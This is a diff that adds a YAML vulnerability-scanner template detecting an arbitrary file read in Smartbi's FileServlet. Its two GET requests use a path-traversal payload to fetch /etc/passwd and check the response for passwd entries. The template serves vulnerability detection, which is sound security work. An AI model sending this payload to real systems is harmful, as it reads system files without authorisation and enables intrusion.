@@ -1,0 +1,24 @@
+id: smartbi-smartbi-bi-readfile
+
+info:
+  name: Smartbi smartbi_bi 任意文件读取
+  author: xpoc
+  severity: high
+  verified: false
+  tags: smartbi,readfile
+  created: 2023/07/13
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx
+            follow_redirects: true
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+    r1:
+        request:
+            method: GET
+            path: /smartbi/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx
+            follow_redirects: true
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0() || r1()
